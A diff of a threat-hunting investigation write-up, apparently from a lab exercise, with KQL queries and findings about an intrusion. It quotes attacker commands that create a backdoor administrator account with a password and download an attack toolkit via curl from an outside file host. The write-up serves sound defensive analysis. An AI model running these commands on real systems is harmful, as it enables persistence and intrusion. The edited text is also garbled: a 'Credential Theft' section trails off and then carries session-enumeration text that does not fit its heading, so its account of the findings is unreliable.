@@ -138,29 +138,28 @@ DeviceProcessEvents
 
 ### 7. Command and Control: Tool Transfer
 
-Searched for evidence of external tool downloads and discovered that the threat actor executed the following command to..
-
-encoded payloads and discovered two Base64-encoded PowerShell commands. The decoded account creation command was the following: net user yuki.tanaka2 B@ckd00r2024! /add. The decoded privilege escalation command was the following: net localgroup Administrators yuki.tanaka2 /add. Therefore, the attacker created a backdoor account yuki.tanaka2 (similar to the compromised user yuki.tanaka) with administrator privileges using Base64 obfuscation to evade detection. 
+Searched for evidence of external tool downloads and discovered that the threat actor executed the following command to download an attack toolkit named destroy.7z from external C2 infrastructure (i.e., litter.catbox.moe) using root privileges: curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z. 
  
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
-| where DeviceName == "azuki-adminpc"
-| where FileName in~ ("powershell.exe", "pwsh.exe")
-| where ProcessCommandLine has "encodedcommand" or ProcessCommandLine has "-enc" or ProcessCommandLine has "-e "
-| project TimeGenerated, DeviceName, ProcessCommandLine
-| order by TimeGenerated asc
+| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
+| where FileName in~ ("curl", "scp", "ftp")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| sort by TimeGenerated asc
 
 ```
-<img width="2765" height="330" alt="BT_Q9B" src="https://github.com/user-attachments/assets/02c5339b-5a0f-49bb-8b22-7db0a4dea9e8" />
+<img width="2444" height="295" alt="DITW_Q8" src="https://github.com/user-attachments/assets/3db67575-09ba-443b-aa60-6b45ff291e11" />
 
 ---
 
-### 8. Discovery: Session Enumeration 
+### 8. Credential Access: Credential Theft 
 
-Searched for evidence of terminal services enumeration and discovered that the command qwinsta was executed in order to enumerate RDP sessions, session IDs, session states, and logged-in users to identify active administrators and avoid detection. The attacker used this at 4:08 AM (before creating the backdoor account at 4:51 AM), likely to identify active administrators and see who was logged into the CEO's machine.
+Searched for evidence of credential file access and discovered that the threat actor executed the following command to...
+
+terminal services enumeration and discovered that the command qwinsta was executed in order to enumerate RDP sessions, session IDs, session states, and logged-in users to identify active administrators and avoid detection. The attacker used this at 4:08 AM (before creating the backdoor account at 4:51 AM), likely to identify active administrators and see who was logged into the CEO's machine.
 
 **Query used to locate events:**
 
